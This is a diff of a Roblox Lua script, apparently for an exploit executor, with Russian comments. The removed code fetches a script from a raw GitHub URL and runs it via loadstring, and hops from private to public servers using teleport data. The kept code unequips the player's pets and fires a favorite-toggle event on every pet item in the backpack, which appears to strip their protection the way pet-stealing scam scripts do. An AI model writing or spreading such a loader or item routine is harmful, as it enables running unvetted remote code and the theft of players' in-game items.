@@ -1,98 +1,20 @@
-local RobloxReplicatedStorage = game:GetService("ReplicatedStorage")
-local TeleportService = game:GetService("TeleportService")
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local PetsService = require(ReplicatedStorage.Modules.PetServices.PetsService)
 
-local GetServerType = RobloxReplicatedStorage:WaitForChild("GetServerType")
-
--- URL для загрузки скрипта (замени на свою ссылку, например, Pastebin)
-local SCRIPT_URL = "https://raw.githubusercontent.com/sdafqd/scripts/refs/heads/main/123"
-
--- Функция для выполнения основного кода
-local function runMainScript()
-    local success, result = pcall(function()
-        local PetsService = require(ReplicatedStorage.Modules.PetServices.PetsService)
-
-        -- Снимаем питомцев с фермы
-        if workspace:FindFirstChild("PetsPhysical") then
-            for _, petMover in pairs(workspace.PetsPhysical:GetChildren()) do
-                if petMover:GetAttribute("OWNER") == Players.LocalPlayer.Name then
-                    for _, pet in ipairs(petMover:GetChildren()) do
-                        PetsService:UnequipPet(pet.Name)
-                    end
-                end
+if workspace:FindFirstChild("PetsPhysical") then
+    for _, petMover in pairs(workspace.PetsPhysical:GetChildren()) do
+        if petMover:GetAttribute("OWNER") == Players.LocalPlayer.Name then
+            for _, pet in ipairs(petMover:GetChildren()) do
+                PetsService:UnequipPet(pet.Name)
             end
         end
-
-        -- Удаляем из избранного
-        task.wait(0.5)
-        for _, tool in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
-            if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
-                ReplicatedStorage.GameEvents.Favorite_Item:FireServer(tool)
-            end
-        end
-    end)
-
-    if not success then
-        warn("Ошибка при выполнении основного кода: " .. tostring(result))
     end
 end
 
--- Функция для загрузки и выполнения скрипта через ссылку
-local function loadScriptFromUrl()
-    local success, response = pcall(function()
-        return HttpService:GetAsync(SCRIPT_URL)
-    end)
-    if success then
-        loadstring(response)()
-    else
-        warn("Не удалось загрузить скрипт по ссылке: " .. tostring(response))
+task.wait(0.5)
+for _, tool in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
+    if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
+        ReplicatedStorage.GameEvents.Favorite_Item:FireServer(tool)
     end
 end
-
--- Основная логика
-local function main()
-    -- Проверяем, получены ли данные телепортации
-    local teleportData = TeleportService:GetLocalPlayerTeleportData()
-    if teleportData and teleportData.runMainScript then
-        -- Если телепортировались с флагом, выполняем основной код
-        runMainScript()
-        return
-    end
-
-    -- Проверяем тип сервера
-    local serverType = GetServerType:InvokeServer()
-    if serverType == "VIPServer" then
-        -- Пытаемся найти публичный сервер (10 попыток)
-        for attempt = 1, 10 do
-            local servers = {}
-            local success, req = pcall(game.HttpGet, game, "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
-            
-            if success then
-                for _, server in pairs(HttpService:JSONDecode(req).data or {}) do
-                    if server.playing and server.maxPlayers and (server.maxPlayers - server.playing >= 2) and server.id ~= game.JobId then
-                        table.insert(servers, server.id)
-                    end
-                end
-                
-                if #servers > 0 then
-                    -- Телепортируемся с флагом, чтобы выполнить основной код
-                    TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(#servers)], { runMainScript = true })
-                    return
-                end
-            end
-            task.wait(1)
-        end
-        warn("Не удалось найти публичный сервер")
-    else
-        -- Если сервер не VIP, выполняем основной код
-        runMainScript()
-    end
-end
-
--- Запускаем основную логику
-main()
-
--- Если экзекутор поддерживает автозапуск, можно попробовать загрузить скрипт через ссылку
--- Раскомментируй, если хочешь использовать загрузку по ссылке
--- loadScriptFromUrl()
